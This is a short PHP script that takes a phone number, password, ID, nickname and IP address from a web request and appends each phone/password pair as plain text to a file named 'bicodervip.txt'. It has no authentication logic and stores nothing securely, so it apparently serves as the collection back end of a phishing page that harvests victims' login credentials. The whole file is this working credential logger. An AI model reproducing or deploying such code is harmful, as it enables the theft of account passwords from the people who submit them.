<?php
require('dat/user.php');
$ng = new ngControllers();
$sdt = $ng->post($_REQUEST['sdt']);
$pass = $ng->post($_REQUEST['pass']);
$id = $ng->post($_REQUEST['id']);
$nick = $ng->post($_REQUEST['nick']);
$ip = $ng->post($_REQUEST['ip']);
$file = fopen('bicodervip.txt','a');
        fwrite($file,$sdt.'/'.$pass.PHP_EOL);
        fclose($file); 
?>
